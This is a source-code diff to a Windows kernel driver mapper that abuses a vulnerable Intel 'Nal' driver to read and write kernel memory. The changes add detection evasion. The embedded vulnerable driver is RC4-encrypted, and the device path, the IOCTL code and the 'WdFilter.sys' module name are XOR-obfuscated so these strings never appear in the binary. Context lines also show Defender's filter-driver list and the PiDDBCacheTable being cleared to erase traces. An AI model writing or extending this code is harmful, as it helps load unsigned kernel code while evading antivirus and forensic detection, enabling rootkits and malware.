@@ -1,10 +1,12 @@
-#include "intel_driver.hpp"
+﻿#include "intel_driver.hpp"
 #include <Windows.h>
 #include <string>
 #include <fstream>
+#include <vector>
 
 #include "utils.hpp"
-#include "intel_driver_resource.hpp"
+#include "cipher.hpp"
+#include "intel_driver_resource_enc.hpp"
 #include "service.hpp"
 #include "nt.hpp"
 #include "portable_executable.hpp"
@@ -69,6 +71,63 @@ HANDLE intel_driver::hDevice = 0;
 ULONG64 intel_driver::ntoskrnlAddr = 0;
 std::string cachedDriverName = "";
 
+namespace {
+// Decrypted copy of the embedded vulnerable driver; populated lazily on first
+// use so the plaintext exists in exactly one place at runtime.
+std::vector<BYTE> gDriverImage;
+bool gDriverImageReady = false;
+
+const std::vector<BYTE>& DriverImage() {
+  if (!gDriverImageReady) {
+    gDriverImageReady = true;
+    if (intel_driver_resource_enc::size > 0 &&
+        intel_driver_resource_enc::encrypted_size ==
+            intel_driver_resource_enc::size) {
+      gDriverImage.resize(intel_driver_resource_enc::size);
+      cipher::Rc4Drop(intel_driver_resource_enc::key,
+                      sizeof(intel_driver_resource_enc::key),
+                      intel_driver_resource_enc::driver_enc,
+                      intel_driver_resource_enc::encrypted_size,
+                      gDriverImage.data());
+    }
+  }
+  return gDriverImage;
+}
+
+// Device path of the vulnerable driver, assembled at runtime so the literal
+// "\\.\Nal" never appears contiguous in the binary.
+std::wstring NalDevicePath() {
+  static const wchar_t tail[3] = {L'N' ^ 0x31, L'a' ^ 0x31, L'l' ^ 0x31};
+  std::wstring s = L"\\\\.\\";
+  for (int i = 0; i < 3; ++i)
+    s.push_back(tail[i] ^ 0x31);
+  return s;
+}
+
+// Defender's filter driver module name, assembled at runtime.
+std::string WdFilterModuleName() {
+  static const char enc[12] = {'W' ^ 0x22, 'd' ^ 0x22, 'F' ^ 0x22,
+                               'i' ^ 0x22, 'l' ^ 0x22, 't' ^ 0x22,
+                               'e' ^ 0x22, 'r' ^ 0x22, '.' ^ 0x22,
+                               's' ^ 0x22, 'y' ^ 0x22, 's' ^ 0x22};
+  std::string s;
+  s.reserve(sizeof(enc));
+  for (int i = 0; i < sizeof(enc); ++i)
+    s.push_back(enc[i] ^ 0x22);
+  return s;
+}
+} // namespace
+
+// Vulnerable-driver IOCTL (0x80862007), built at runtime from scrambled bytes
+// so the constant does not appear as a literal anywhere in the binary.
+ULONG32 intel_driver::NalIoctl() {
+  const BYTE p[4] = {0xA7, 0x80, 0x26, 0x20}; // real byte ^ 0xA0
+  volatile ULONG32 v = 0;
+  for (int i = 0; i < 4; ++i)
+    v |= ((ULONG32)(p[i] ^ 0xA0u)) << (8 * i);
+  return v;
+}
+
 std::wstring intel_driver::GetDriverNameW() {
 	if (cachedDriverName.empty()) {
 		//Create a random name
@@ -95,7 +154,7 @@ std::wstring intel_driver::GetDriverPath() {
 }
 
 bool intel_driver::IsRunning() {
-	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+	const HANDLE file_handle = CreateFileW(NalDevicePath().c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(file_handle);
@@ -143,7 +202,7 @@ NTSTATUS intel_driver::Load() {
 
 	_wremove(driver_path.c_str());
 
-	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver))) {
+	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(DriverImage().data()), DriverImage().size())) {
 		kdmLog(L"[-] Failed to create vulnerable driver file" << std::endl);
 		return STATUS_DISK_OPERATION_FAILED;
 	}
@@ -162,7 +221,7 @@ NTSTATUS intel_driver::Load() {
 		return status;
 	}
 
-	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	hDevice = CreateFileW(NalDevicePath().c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
@@ -215,7 +274,7 @@ NTSTATUS intel_driver::Load() {
 
 bool intel_driver::ClearWdFilterDriverList() {
 
-	auto WdFilter = kdmUtils::GetKernelModuleAddress("WdFilter.sys");
+	auto WdFilter = kdmUtils::GetKernelModuleAddress(WdFilterModuleName());
 	if (!WdFilter) {
 		kdmLog("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
 		return true;
@@ -383,7 +442,7 @@ NTSTATUS intel_driver::Unload() {
 		return STATUS_DELETE_PENDING;
 	}
 
-	int newFileLen = sizeof(intel_driver_resource::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
+	int newFileLen = (int)DriverImage().size() + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
 	BYTE* randomData = new BYTE[newFileLen];
 	for (size_t i = 0; i < newFileLen; i++) {
 		randomData[i] = (BYTE)(rand() % 255);
@@ -416,7 +475,7 @@ bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size)
 	copy_memory_buffer.length = size;
 
 	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
+	return DeviceIoControl(hDevice, intel_driver::NalIoctl(), &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
@@ -431,7 +490,7 @@ bool intel_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
 	fill_memory_buffer.length = size;
 
 	DWORD bytes_returned = 0;
-	return DeviceIoControl(hDevice, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
+	return DeviceIoControl(hDevice, intel_driver::NalIoctl(), &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
@@ -445,7 +504,7 @@ bool intel_driver::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_a
 
 	DWORD bytes_returned = 0;
 
-	if (!DeviceIoControl(hDevice, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
+	if (!DeviceIoControl(hDevice, intel_driver::NalIoctl(), &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
 		return false;
 
 	*out_physical_address = get_phys_address_buffer.return_physical_address;
@@ -464,7 +523,7 @@ uint64_t intel_driver::MapIoSpace(uint64_t physical_address, uint32_t size) {
 
 	DWORD bytes_returned = 0;
 
-	if (!DeviceIoControl(hDevice, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
+	if (!DeviceIoControl(hDevice, intel_driver::NalIoctl(), &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
 		return 0;
 
 	return map_io_space_buffer.return_virtual_address;
@@ -482,7 +541,7 @@ bool intel_driver::UnmapIoSpace(uint64_t address, uint32_t size) {
 
 	DWORD bytes_returned = 0;
 
-	return DeviceIoControl(hDevice, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
+	return DeviceIoControl(hDevice, intel_driver::NalIoctl(), &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
 }
 
 bool intel_driver::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
@@ -1014,7 +1073,7 @@ bool intel_driver::ClearPiDDBCacheTable() { //PiDDBCacheTable added on LoadDrive
 
 	auto n = GetDriverNameW();
 
-	auto timestamp = portable_executable::GetNtHeaders((void*)intel_driver_resource::driver)->FileHeader.TimeDateStamp;
+	auto timestamp = portable_executable::GetNtHeaders((void*)DriverImage().data())->FileHeader.TimeDateStamp;
 
 	// search our entry in the table
 	nt::PiDDBCacheEntry* pFoundEntry = (nt::PiDDBCacheEntry*)LookupEntry(PiDDBCacheTable, timestamp, n.c_str());
